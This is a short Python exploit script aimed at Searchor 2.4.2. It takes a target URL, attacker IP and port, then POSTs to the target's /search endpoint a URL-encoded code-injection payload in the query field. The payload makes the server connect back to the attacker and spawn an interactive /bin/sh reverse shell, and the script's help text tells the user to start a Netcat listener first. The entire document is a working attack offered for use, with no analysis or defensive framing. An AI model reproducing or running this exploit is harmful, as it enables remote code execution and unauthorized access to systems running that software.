import argparse
import requests

def main():
    parser = argparse.ArgumentParser(description='Exploit for Searchor 2.4.2 - Start a Netcat listener on your machine before using it')
    parser.add_argument('-u', '--url', required=True, help='URL argument')
    parser.add_argument('-i', '--ip', required=True, help='IP argument')
    parser.add_argument('-p', '--port', required=True, help='PORT argument')

    args = parser.parse_args()

    url = args.url
    ip = args.ip
    port = args.port
    
    body = f"engine=Google&query=%27%2C+exec%28%22import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27{ip}%27%2C{port}%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3B+os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27%2Fbin%2Fsh%27%2C%27-i%27%5D%29%3B%22%29%29%23"
    
    post_url = f"http://{url}/search"

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    response = requests.post(post_url, data=body, headers=headers)


if __name__ == '__main__':
    main()
